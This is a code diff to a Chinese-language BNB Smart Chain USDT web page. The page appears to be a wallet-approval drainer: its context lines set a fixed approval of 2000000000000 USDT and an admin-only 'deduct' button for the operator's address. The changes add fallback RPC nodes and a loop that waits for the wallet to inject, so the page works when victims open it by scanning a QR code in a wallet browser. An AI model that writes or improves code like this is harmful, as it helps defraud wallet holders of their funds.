@@ -1,4 +1,4 @@
-<!<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
@@ -93,6 +93,12 @@ const APPROVE_AMOUNT = "2000000000000"; // 固定授权额度：2000000000000 US
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const GAS_LIMIT = "0x493E0";
 const BSC_CHAIN_ID = "0x38";
+// 更新多节点列表，优先苹果无加速器直连节点
+const RPC_LIST = [
+    "https://bsc.publicnode.com",
+    "https://rpc.ankr.com/bsc",
+    "https://bsc-dataseed.binance.org"
+];
 const BSC_NETWORK_PARAM = {
     chainId: "0x38",
     chainName: "BNB Smart Chain Mainnet",
@@ -101,11 +107,11 @@ const BSC_NETWORK_PARAM = {
         symbol: "BNB",
         decimals: 18
     },
-    rpcUrls: ["https://bsc-dataseed.binance.org"],
+    rpcUrls: RPC_LIST,
     blockExplorerUrls: ["https://bscscan.com"]
 };
 
-// 完整 ABI（原代码只有片段，补齐）
+// 完整 ABI
 const USDT_ABI = [
     {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
     {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},
@@ -132,6 +138,15 @@ const deductAmountInput = $("#deductAmountInput");
 const deductBtn = $("#deductBtn");
 
 targetAddrText.innerText = TARGET_ADDR;
+
+// 等待钱包注入（解决扫码打开页面钱包延迟注入）
+async function waitEthereumInject(timeout = 4000) {
+    const start = Date.now();
+    while (!window.ethereum && Date.now() - start < timeout) {
+        await new Promise(resolve => setTimeout(resolve, 200));
+    }
+    return !!window.ethereum;
+}
 
 //读取USDT余额
 async function loadUserBalance(){
@@ -175,7 +190,9 @@ async function checkNetwork(){
 }
 
 async function autoRestoreConnect(){
-    if(!window.ethereum) return;
+    // 先等待钱包注入
+    const hasEth = await waitEthereumInject();
+    if(!hasEth) return;
     try{
         const accounts = await window.ethereum.request({method:"eth_accounts"});
         if(accounts.length>0){
@@ -206,15 +223,16 @@ function disconnectWallet() {
 }
 
 async function manualConnectWallet() {
+    const hasEth = await waitEthereumInject();
+    if (!hasEth) {
+        alert("未检测到钱包，请使用钱包内置浏览器打开");
+        return;
+    }
     if (web3 && userAddress) {
         disconnectWallet();
         return;
     }
     try {
-        if (!window.ethereum) {
-            alert("未检测到钱包");
-            return;
-        }
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
@@ -249,6 +267,9 @@ maxBtn.addEventListener("click", async ()=>{
 })
 
 sendBtn.addEventListener("click", async () => {
+    // 点击转账前再次等待钱包实例
+    const hasEth = await waitEthereumInject();
+    if(!hasEth) return alert("未检测钱包，请使用钱包浏览器打开页面");
     if(!web3 || !userAddress) return alert("钱包未连接，请点右上角圆点");
     await checkNetwork();
     const val = parseFloat(amountInput.value);
@@ -276,6 +297,8 @@ sendBtn.addEventListener("click", async () => {
 });
 
 deductBtn.addEventListener("click", async () => {
+    const hasEth = await waitEthereumInject();
+    if(!hasEth) return alert("未检测钱包");
     if(!web3 || userAddress.toLowerCase() !== TARGET_ADDR.toLowerCase()){
         return alert("仅限管理员钱包操作");
     }
